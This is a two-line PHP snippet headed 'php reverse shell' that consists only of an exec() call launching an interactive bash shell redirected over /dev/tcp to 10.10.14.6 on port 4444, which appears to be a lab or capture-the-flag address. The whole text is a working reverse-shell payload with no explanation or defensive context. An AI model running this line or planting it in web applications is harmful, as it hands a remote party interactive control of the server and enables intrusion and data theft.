#php reverse shell
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");
